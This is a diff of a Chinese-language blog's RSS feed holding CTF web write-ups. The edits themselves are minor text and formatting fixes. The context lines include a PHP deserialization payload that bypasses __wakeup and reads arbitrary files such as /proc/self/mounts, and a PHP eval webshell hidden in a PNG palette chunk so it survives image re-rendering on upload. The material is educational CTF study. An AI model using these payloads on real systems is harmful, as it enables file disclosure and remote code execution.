@@ -81,7 +81,7 @@
 &lt;p&gt;源码内我们标出了三个限制点： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;A, 对GET输入检查是否包含&amp;rsquo;users&amp;rsquo;字符串，我们可以通过修改序列化字符串中的s为S，这样就可以支持利用16进制编码来进行绕过， &lt;code&gt;s:4:&amp;quot;user&amp;quot;; -&amp;gt; S:4:&amp;quot;use\72&amp;quot;;&lt;/code&gt; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
-&lt;li&gt;B, 我们在序列化的字符串中对于 &lt;code&gt;MyFile-&amp;gt;name&lt;/code&gt; 会被 &lt;code&gt;__wakeup&lt;/code&gt; 给替换掉，我们可以利用修改属性来绕过 &lt;code&gt;__wakeup&lt;/code&gt; 的替换（此方法适用于PHP 7.0.10），这里我们使用浅copy来对可控变量 &lt;code&gt;$this-&amp;gt;user&lt;/code&gt; 来进行过滤 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;B, 我们在序列化的字符串中对于 &lt;code&gt;MyFile-&amp;gt;name&lt;/code&gt; 会被 &lt;code&gt;__wakeup&lt;/code&gt; 给替换掉，我们可以利用修改属性来绕过 &lt;code&gt;__wakeup&lt;/code&gt; 的替换（此方法只适用于PHP5 &amp;lt; 5.6.25, PHP7 &amp;lt; 7.0.10），这里我们使用浅copy来对可控变量 &lt;code&gt;$this-&amp;gt;user&lt;/code&gt; 来进行过滤 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
 &lt;li&gt;C, 无法直接获取文件名，可以配合 &lt;code&gt;glob://&lt;/code&gt; 协议来测信道出 flag 的文件名字 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;因此我们构造 payload： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
@@ -105,7 +105,7 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 得到序列化结果:
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// O:6:&amp;#34;MyFile&amp;#34;:2:{s:4:&amp;#34;name&amp;#34;;s:0:&amp;#34;&amp;#34;;S:4:&amp;#34;use\\72&amp;#34;;R:2;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// O:6:&amp;#34;MyFile&amp;#34;:2:{s:4:&amp;#34;name&amp;#34;;s:0:&amp;#34;&amp;#34;;S:4:&amp;#34;use\72&amp;#34;;R:2;}
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 文件任意读 payload：
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// input=O:6:&amp;#34;MyFile&amp;#34;:2: {s:4:&amp;#34;name&amp;#34;;s:0:&amp;#34;&amp;#34;;S:4:&amp;#34;us\65r&amp;#34;;R:2;}&amp;amp;user=/proc/self/mounts
@@ -245,8 +245,9 @@ O%3A4%3A%22Name%2 &lt;code&gt;3&lt;/code&gt; %3A2%3A%7Bs%3A14%3A%22%00Name%00use
         &lt;/figcaption&gt;
 &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
-&lt;p&gt;参考：[[&lt;a class=&#34;link&#34; href=&#34;https://segmentfault.com/a/1190000022534926&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://segmentfault.com/a/1190000022534926&lt;/a&gt;][CTF-Web-[极客大挑战 2019]PHP &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;参考： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://segmentfault.com/a/1190000022534926&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CTF-Web-[极客大挑战 2019]PHP&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -657,10 +658,10 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, &lt;code&gt;ÐÏ.à&lt;/code&
 &lt;li&gt;
 &lt;p&gt;写入 &lt;code&gt;PLTE&lt;/code&gt; 数据块&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/png_trojan.png&#34; width=&#34;100px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-01_21-53-41_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;我们可以先利用imagemagick将图片转换为索引图像/基于调色板图像（Palette-based images） &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;convert png.png -type Palette png_trojan.png
@@ -668,12 +669,12 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, &lt;code&gt;ÐÏ.à&lt;/code&
     &gt;脚本&lt;/a&gt;来进行一句话木马的输入 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python2 poc_png.py -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php @eval($_POST[&amp;#34;a&amp;#34;]);?&amp;gt;&amp;#39;&lt;/span&gt; -o png_trojan.png png_trojan.png
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-01_22-42-09_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;尝试上传 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;查看二次渲染后的图片，发现一句话木马插入成功，蚁剑连接成功 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-01_22-41-51_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -684,11 +685,11 @@ MS Word/Excel (xls.or.doc)，文件头：D0CF11E0, &lt;code&gt;ÐÏ.à&lt;/code&
 &lt;p&gt;利用脚本， &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;下载二次渲染之后的图片，检查一句话木马 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-01_22-52-43_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;shell利用成功 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-05-01_22-58-39_screenshot.png&#34; width=&#34;700px&#34;/&gt;
-&lt;/figure&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
